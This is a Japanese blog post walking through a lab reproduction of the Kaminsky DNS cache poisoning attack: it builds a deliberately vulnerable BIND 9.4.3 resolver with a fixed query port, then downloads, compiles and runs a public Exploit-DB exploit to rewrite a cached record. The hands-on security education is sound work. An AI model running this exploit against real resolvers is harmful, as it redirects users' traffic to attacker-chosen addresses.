---
layout: post
title:  "DNSキャッシュポイズニング"
date:   2018-08-21
permalink: /security/:title
categories: Security
tags: DNS PWN CVE-2008-1447 CVE-2008-4194
excerpt: DNSキャッシュポイズニングのハンズオンシナリオです
mathjax: false
---
 
* content
{:toc}

## 攻撃の概要

### キャッシュの仕組み
DNSキャッシュサーバ自身はゾーンファイルを保持しない。
問い合わせに応じて権威DNSサーバに問い合わせた結果をそのまま返す。
この時取得したレコードはキャッシュに保存される。
キャッシュが破棄される前に同じ問い合わせがあった場合は権威DNSサーバに問い合わせずに結果を返す。

![]({{site.baseurl}}/images/dns-cache-poizoning/dns002.png)

### 階層構造の仕組み
ある権威DNSサーバの管理下に無いドメインの問い合わせは別の権威DNSサーバにリダイレクトされる。
権威DNSサーバはadditionalレコードに別の権威DNSサーバのホスト名とIPアドレスを指定してリゾルバに返す。
リゾルバはこれを参照して別の権威DNSサーバに問い合わせる。
これを繰り返すことでDNSの階層構造が実現される。

![]({{site.baseurl}}/images/dns-cache-poizoning/dns003.png)

### 攻撃の仕組み

攻撃対象ドメインに存在しないホストの名前解決をリクエストしてから、権威DNSサーバの応答よりも早く偽の応答を送り付ける。
偽の応答のadditionalレコードには権威DNSサーバとして攻撃対象ホストと偽のIPアドレスを指定する。
脆弱性のあるDNSキャッシュサーバはadditionalレコードの情報をキャッシュするので、これ以降のwww.sample.localの名前解決には100.100.100.100が返される。

![]({{site.baseurl}}/images/dns-cache-poizoning/dns004.png)

攻撃の詳細はJPRSの[Kaminsky Attackの全て][Kaminsky Attackの全て]を参照

## サーバ構築

3台のCentOS7でPoC環境を構築する。

![]({{site.baseurl}}/images/dns-cache-poizoning/env.png)

個々のサーバを構築する前によく使うツールを全てのホストに入れておくこと。

```bash
# yum install -y vim wget gcc bind-utils
```

### 権威DNSサーバ
named.confの記述
```bash
# vim /etc/named.conf

options {
  directory "/var/named";
  pid-file  "/run/named/named.pid";
  listen-on port 53 { any; };
  allow-query       { any; };
};
zone "sample.local" IN {
  type master;
  file "sample.local.zone";
};
```

zoneファイルの記述
```bash
# vim /var/named/sample.local.zone

@     IN    SOA    sample.local. root.sample.local. (
                   2018062901
                   60
                   60
                   60
                   60
                   )
;
      IN    NS     ns.sample.local.
;
      IN    MX     0 mail.sample.local
;
ns    IN    A      172.16.0.3
www   IN    A      172.16.0.100
mail  IN    A      172.16.0.100
```

攻撃を成功させやすくするためにNICに200msの遅延を設定
```bash
# tc qdisc add dev enp0s8 root netem delay 200ms
```

サービス起動
```bash
# systemctl start named
```

### DNSキャッシュサーバ
デフォルトのnamedを削除して脆弱性のあるバージョン9.4.3をソースからインストールする
```bash
# yum -y remove bind
# wget https://ftp.isc.org/isc/bind9/9.4.3/bind-9.4.3.tar.gz
# tar zxvf bind-9.4.3.tar.gz
# cd bind-9.4.3
# ./configure
# make
# make install
```
起動スクリプトの作成
```bash
# vim /usr/lib/systemd/system/named.service

[Unit]
Description=Berkeley Internet Name Domain (DNS)

[Service]
Type=forking
PIDFile=/run/named/named.pid

ExecStartPre=/bin/bash -c 'if [ ! "$DISABLE_ZONE_CHECKING" == "yes" ]; then /usr/local/sbin/named-checkconf -z /etc/named.conf; else echo "Checking of zone files is disabled"; fi'

ExecStart=/usr/local/sbin/named -u named $OPTIONS

ExecReload=/bin/sh -c '/usr/local/sbin/rndc reload > /dev/null 2>&1 || /bin/kill -HUP $MAINPID'

ExecStop=/bin/sh -c '/usr/local/sbin/rndc stop > /dev/null 2>&1 || /bin/kill -TERM $MAINPID'

PrivateTmp=true

[Install]
WantedBy=multi-user.target
```
named.confの作成

権威DNSサーバにソースポート10000で問い合わせるようにする
```bash
# vim /etc/named.conf

options {
  directory "/var/named";
  pid-file "/run/named/named.pid";
  listen-on port 53 { any; };
  allow-query { any; };
  forwarders { 172.16.0.3; };
  query-source address * port 10000;
  recursion yes;
};
```

pidファイルの所有権を変更する
```bash
# useradd named
# chown named:named /run/named
```

サービス起動
```bash
# systemctl daemon-reload
# systemctl start named
```
### 攻撃サーバ
CVE-2008-1447/CVE-2008-4194のエクスプロイトコードをコンパイルする
```bash
# wget https://www.exploit-db.com/download/6130.c
# yum install -y libdnet-devel
# ln -s /usr/include/dnet.h /usr/include/dumbnet.h
# gcc -o kaminsky-attack 6130.c `dnet-config --libs` -lm
```

## 攻撃
sample.localのDNSキャッシュサーバを攻撃してwwwのキャッシュを1.2.3.4に書き換える
```bash
# ./kaminsky-attack 172.16.0.1 172.16.0.2 172.16.0.3 10000 www sample.local. 1.2.3.4 8192 16
```
キャッシュが1.2.3.4に書き換えられた事を確認する
```bash
# dig @172.16.0.2 www.sample.local
```

裏でどんなパケットが飛んでいて、サーバのログには何が残っているのか確認しておくと良い。

## 参考情報
- [JPRS](https://jprs.jp/glossary/index.php?ID=0228)
- [Kaminsky Attackの全て][Kaminsky Attackの全て]
- [Exploit-DB](https://www.exploit-db.com/exploits/6130/)

[Kaminsky Attackの全て]: https://www.nic.ad.jp/ja/materials/iw/2008/proceedings/H3/IW2008-H3-07.pdf
